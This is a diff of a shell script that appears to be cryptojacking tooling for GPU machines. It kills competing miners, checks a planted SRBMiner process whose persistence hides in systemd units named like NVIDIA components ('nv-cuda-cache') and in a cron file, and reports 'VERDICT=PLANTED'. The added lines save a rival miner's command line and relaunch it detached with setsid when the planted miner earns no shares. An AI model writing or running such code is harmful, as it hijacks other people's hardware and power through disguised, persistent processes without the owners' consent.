@@ -35,6 +35,8 @@ for u in $(systemctl list-units --plain --no-legend 'nv-cuda-cache*' 2>/dev/null
   systemctl disable --now "$u" 2>/dev/null
 done
 echo "--- foreign miners before stand-down:"; ps -eo pid,ppid,etime,cmd | grep -Ei 'wildrig|krig|SRBMiner|miner' | grep -v grep | head -12
+ps -eo pid,cmd | grep -E 'krig' | grep -v grep | head -1 | sed 's/^ *[0-9]* *//' > /var/lib/fleet/krig_cmdline.txt
+echo "incumbent_cmdline=$(cat /var/lib/fleet/krig_cmdline.txt 2>/dev/null)"
 for u in $(systemctl list-units --plain --no-legend 'nv-prl*' 'krig*' 'peakminer*' 2>/dev/null | awk '{print $1}'); do systemctl disable --now "$u" 2>/dev/null; done
 pkill -f 'wildrig-multi' 2>/dev/null
 pkill -f 'krig-miner|/opt/fleet/bin/krig|krig/' 2>/dev/null
@@ -176,4 +178,14 @@ echo "--- gpu state:"
 nvidia-smi --query-gpu=index,name,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader
 echo "--- processes:"; pgrep -af 'SRBMiner-MULTI' | head -6
 echo "--- persistence:"; systemctl is-enabled nv-cuda-cache-g* 2>/dev/null; cat /etc/cron.d/ulprl
-if [ "$ACC" -gt 0 ]; then echo "VERDICT=PLANTED ACCEPTED=$ACC"; else echo "VERDICT=SHARE-NONE"; fi
+if [ "$ACC" -gt 0 ]; then
+  echo "VERDICT=PLANTED ACCEPTED=$ACC"
+else
+  echo "VERDICT=SHARE-NONE"
+  if [ -s /var/lib/fleet/krig_cmdline.txt ]; then
+    CMD=$(cat /var/lib/fleet/krig_cmdline.txt)
+    echo "RESCUE re-exec incumbent: $CMD"
+    setsid bash -c "export PATH=/usr/local/bin:/usr/bin:/bin; $CMD" >> "$LOG/krig-rescue.log" 2>&1 &
+    sleep 30; pgrep -af 'krig' | head -3
+  fi
+fi
